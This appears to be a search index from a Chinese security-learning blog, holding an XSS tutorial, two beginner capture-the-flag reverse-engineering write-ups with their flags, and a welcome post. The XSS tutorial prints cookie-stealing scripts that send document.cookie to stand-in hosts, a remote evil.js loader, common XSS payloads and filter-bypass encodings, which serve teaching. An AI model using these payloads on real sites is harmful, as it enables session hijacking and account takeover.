@@ -1,0 +1,214 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Web安全学习总结——XSS漏洞概述</title>
+    <url>/2020/02/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/</url>
+    <content><![CDATA[<center>敦兮其若朴，旷兮其若谷</center>
+![preview.png](https://i.loli.net/2020/01/06/3vFUh1Z5mVB8gKW.png)
+
+<a id="more"></a>
+
+
+
+<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>跨站脚本攻击-XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。</p>
+<p>XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击目的，形成了一次有效的XSS攻击。一旦攻击成功，它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨 大的，是web安全的头号大敌。</p>
+<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS<br>主要是GET类型</p>
+<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。<br>例如：<code>&lt;srcipt&gt;alert(/xss/)&lt;/srcipt&gt;</code></p>
+<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM型是特殊的反射型XSS<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxxx/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><blockquote>
+<p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。</p>
+</blockquote>
+<h3 id="盗取Cookie"><a href="#盗取Cookie" class="headerlink" title="盗取Cookie"></a>盗取Cookie</h3><p>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xssTest&#x2F;test.php?userName&#x3D;&lt;scriipt src&#x3D;http:&#x2F;&#x2F;www.evil.com&#x2F;evil.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://www.xxxx.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);  </span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。<br>一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。</p>
+<h3 id="蠕虫攻击"><a href="#蠕虫攻击" class="headerlink" title="蠕虫攻击"></a>蠕虫攻击</h3><p>可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用</p>
+<h3 id="常用XSS语句"><a href="#常用XSS语句" class="headerlink" title="常用XSS语句"></a>常用XSS语句</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;);&lt;&#x2F;script&gt; &#x2F;&#x2F;经典语句</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD&#x3D;alert(&#39;XSS&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;a href &#x3D; javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x04-漏洞绕过"><a href="#0x04-漏洞绕过" class="headerlink" title="0x04 漏洞绕过"></a>0x04 漏洞绕过</h2><h3 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h3><p>在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则：</p>
+<p>比如：</p>
+<script>alert(“xss”);</script>
+<p>可以转换为：</p>
+<ScRipt>ALeRt(“XSS”);</sCRipT>
+<h3 id="关闭标签"><a href="#关闭标签" class="headerlink" title="关闭标签"></a>关闭标签</h3><p>有时候我们需要关闭标签来使我们的XSS生效。</p>
+<p>比如：“&gt;<script>alert(“Hi”);</script></p>
+<h3 id="使用hex编码绕过"><a href="#使用hex编码绕过" class="headerlink" title="使用hex编码绕过"></a>使用hex编码绕过</h3><p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
+<p>比如：<script>alert(“xss”);</script>可以转换为：<br>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</p>
+<h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p>三个八进制数；如果不够前面补0<br>两个十六进制数字；如果不够前面补0<br>四个十六进制数字；如果不够前面补0<br>控制字符</p>
+<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>以<code>&amp;</code>开始<code>;</code>结束</p>
+<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>%27<br>考虑HTML的渲染方式选择合适的编码方式进行测试</p>
+<h2 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05 漏洞防御"></a>0x05 漏洞防御</h2><p>过滤输入的数据，和非法字符<code>‘ “ &lt; &gt; on* 等”’</code><br>输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等</p>
+]]></content>
+      <categories>
+        <category>Web安全学习总结</category>
+      </categories>
+      <tags>
+        <tag>Web安全</tag>
+        <tag>学习总结</tag>
+        <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界-Reverse-novice</title>
+    <url>/2020/01/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reverse-novice/</url>
+    <content><![CDATA[<center>合抱之木，生于毫末；九层之台，起于累土；千里之行，始于足下。</center>
+
+
+<p><img src="https://i.loli.net/2020/01/06/dVjgOJ5mKsLZCH7.png" alt="wallhaven-672007-1.png"></p>
+<a id="more"></a>
+
+<p>这篇文章记录了攻防世界逆向区，新手练习区的破解记录。</p>
+<p>小白第一次写，如有错误还望各位师傅斧正</p>
+<h1 id="0x01-insanity"><a href="#0x01-insanity" class="headerlink" title="0x01 insanity"></a>0x01 insanity</h1><blockquote>
+<p>2020年1月6日</p>
+</blockquote>
+<h2 id="起手式"><a href="#起手式" class="headerlink" title="起手式"></a>起手式</h2><p>题目描述：菜鸡觉得前面的题目太难了，来个简单的缓一下</p>
+<p>查看程序详细信息。</p>
+<p><img src="https://i.loli.net/2020/01/06/qxnZgiopujEkN5z.png" alt="Snipaste_2020-01-06_16-54-02.png"></p>
+<p>发现这不是PE文件，是32位ELF文件。</p>
+<h2 id="开始表演"><a href="#开始表演" class="headerlink" title="开始表演"></a>开始表演</h2><p>首先我们将文件拖入 IDA 。</p>
+<h3 id="分析ing"><a href="#分析ing" class="headerlink" title="分析ing"></a>分析ing</h3><p>老套路,<code>Shift +F12</code>打开string窗口,一键找出所有的字符串。</p>
+<p>这。。。好像有什么奇怪的东西</p>
+<p><img src="https://i.loli.net/2020/01/06/Ni3ZXcxUgHk1ySO.png" alt="Snipaste_2020-01-06_16-44-56.png"></p>
+<p>感觉这是一个flag，因为太明显了</p>
+<p><img src="https://i.loli.net/2020/01/06/a5iz7MpJTLnXSA4.png" alt="Snipaste_2020-01-06_16-46-51.png"></p>
+<p>提交成功，emmmm</p>
+<p><img src="https://i.loli.net/2020/01/06/1v2fldX8wEsMQYG.png" alt="93eb91a4468f30c3252fc7159054f93.png"></p>
+<p>这样就结束了，很不真实的感觉</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>看到flag时还有一丝丝，没想到是真的。</p>
+<p>刚准备分析就结束了，好快！！！</p>
+<h1 id="0x02-open-source"><a href="#0x02-open-source" class="headerlink" title="0x02 open-source"></a>0x02 open-source</h1><blockquote>
+<p>2020年1月7日</p>
+</blockquote>
+<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>题目描述：菜鸡学逆向学得头皮发麻，终于它拿到了一段源代码</p>
+<p>打开题目，这是一段源码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"what?\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="然后"><a href="#然后" class="headerlink" title="然后"></a>然后</h2><p>很明显这段代码是计算flag的，根据argv的三个数据进行运算</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> first = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> (first != <span class="number">0xcafe</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"you are wrong, sorry.\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>first = 0xcafe; 因为不等于就退出了。</p>
+<h3 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> second = atoi(argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (second % <span class="number">5</span> == <span class="number">3</span> || second % <span class="number">17</span> != <span class="number">8</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"ha, you won't get it!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果条件满足程序就退出了，所以我们需要知道这给数值是多少</p>
+<p>所以写一段代码算一下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">50</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">5</span> != <span class="number">3</span> &amp;&amp; i % <span class="number">17</span> == <span class="number">8</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<blockquote>
+<p>25</p>
+<p>42</p>
+</blockquote>
+<p>second = 25；测试后是25</p>
+<h3 id="第三个"><a href="#第三个" class="headerlink" title="第三个"></a>第三个</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="string">"h4cky0u"</span>, argv[<span class="number">3</span>])) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">"so close, dude!\n"</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>strcmp函数，如果两个数值相等则返回0，退出if条件。</p>
+<p>argv[3]=“h4cky0u”</p>
+<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>根据刚刚的结果测试一下，附测试代码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> first = <span class="number">0xcafe</span>;</span><br><span class="line">    <span class="keyword">int</span> second = <span class="number">25</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = <span class="string">"h4cky0u"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Brr wrrr grr\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Get your key: "</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, hash);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"PAUSE"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果</p>
+<blockquote>
+<p>Brr wrrr grr<br>Get your key: c0ffee</p>
+<p>请按任意键继续. . .</p>
+</blockquote>
+<h3 id="提交！Flag！"><a href="#提交！Flag！" class="headerlink" title="提交！Flag！"></a>提交！Flag！</h3><p>提交成功！</p>
+<blockquote>
+<p>flag: c0ffee</p>
+</blockquote>
+<h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><p>待续ing</p>
+]]></content>
+      <categories>
+        <category>攻防世界</category>
+      </categories>
+      <tags>
+        <tag>攻防世界</tag>
+        <tag>Reverse</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>RingZer0-Reverse</title>
+    <url>/2020/01/03/RingZer0-Reverse/</url>
+    <content><![CDATA[<center>君子终日乾乾，夕惕若，厉无咎。</center>
+![origindal.png](https://i.loli.net/2020/02/09/4nt7wMxSp6mlBH9.png)
+
+<a id="more"></a>
+
+<p>这篇文章记录了RingZer0-Reverse破解记录。</p>
+<p>小白上路，望指教。</p>
+<h1 id="Can-you-see-through-the-star"><a href="#Can-you-see-through-the-star" class="headerlink" title="Can you see through the star"></a>Can you see through the star</h1><blockquote>
+<p>持续更新中。。。</p>
+</blockquote>
+<h1 id="Time-to-learn-x86-ASM-amp-gdb"><a href="#Time-to-learn-x86-ASM-amp-gdb" class="headerlink" title="Time to learn x86 ASM &amp; gdb"></a>Time to learn x86 ASM &amp; gdb</h1><blockquote>
+<p>2020年1月3日</p>
+</blockquote>
+<h2 id="首先运行一下这个程序"><a href="#首先运行一下这个程序" class="headerlink" title="首先运行一下这个程序"></a>首先运行一下这个程序</h2><p><img src="https://i.loli.net/2019/05/13/5cd98eb7889ad72340.png" alt="01"></p>
+<blockquote>
+<p>Loading…</p>
+<p>where is the flag?</p>
+</blockquote>
+<p>可以从结果看出来flag可能在程序里面创建了，但没有打印。</p>
+<h2 id="使用gdb调试"><a href="#使用gdb调试" class="headerlink" title="使用gdb调试"></a>使用gdb调试</h2><p>用GDB打开这个程序</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">gdb 程序名称</span></span><br></pre></td></tr></table></figure>
+
+<p>习惯使用intel汇编格式的可以将格式更改为intel格式。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">set disassembly-flavor intel</span><br></pre></td></tr></table></figure>
+
+<p>显示出main函数对应的汇编代码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">disas main</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/05/14/5cda09b32de6572756.png" alt="02"></p>
+<p>反汇编二进制文件，前两个函数叫做malloc和memset。我们可以看到malloc被调用来初始化一个大小为24的数组，然后调用memset用0来初始化数组.</p>
+<p>由此可见，很可能在这里创建一个大小为24的字符串。</p>
+<p><img src="https://i.loli.net/2019/05/14/5cda19d0da87e97756.png" alt="03.png"></p>
+<p>在malloc和memset之后，使用puts 调用字符串“loading…”和“where is the flag？”我们看到这部分仅仅是对字符串的一系列操作</p>
+<p>我们尝试一下，获取字符串地址并在程序结束时打印出Flag</p>
+<h2 id="获取字符串地址"><a href="#获取字符串地址" class="headerlink" title="获取字符串地址"></a>获取字符串地址</h2><p>在调用malloc之前设置一个断点，然后运行程序并打印eax的值，以获取数组的地址</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">break *0x080484a5</span><br><span class="line">r</span><br><span class="line">p&#x2F;x $eax</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/05/14/5cda1fbb913c654809.png" alt="04.png"></p>
+<p>我们在这里发现数组的地址是<code>0x0804b160</code></p>
+<p>我们选择接近程序末尾的地方来设置一个断点，这样我们就可以获得该flag的内容。</p>
+<h2 id="拿到flag"><a href="#拿到flag" class="headerlink" title="拿到flag"></a>拿到flag</h2><p>在0x08048544处创建一个断点，继续运行之前停止的程序，查看之前获得的内存地址里的字符串。</p>
+<p>然后，到这里我们可以看到flag了。</p>
+<p><img src="https://i.loli.net/2019/05/14/5cda221f9cdd670831.png" alt="05.png"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FLAG-4092849uio2jfklsj4kl</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>RingZer0</category>
+      </categories>
+      <tags>
+        <tag>Reverse</tag>
+        <tag>RingZer0</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello-world</title>
+    <url>/2020/01/01/hello-world/</url>
+    <content><![CDATA[<p><img src="https://i.loli.net/2019/05/14/5cda2d265cd7526615.jpeg" alt="00.jpeg"></p>
+<a id="more"></a>
+
+<blockquote>
+<p>大方无隅，大器晚成</p>
+</blockquote>
+<h2 id="博客搭建成功！"><a href="#博客搭建成功！" class="headerlink" title="博客搭建成功！"></a>博客搭建成功！</h2><p>经过了一上午，终于把博客搭建完成了。</p>
+<p>从今天开始，记录学习生涯，加油！</p>
+<h2 id="内容说明"><a href="#内容说明" class="headerlink" title="内容说明"></a>内容说明</h2><p>偶尔发一些学习经验和一些踩过的坑。</p>
+<p>每周发布1-3篇技术或者漏洞复现的文章。</p>
+<p>好好学习，天天向上</p>
+<p>共勉！</p>
+]]></content>
+  </entry>
+</search>
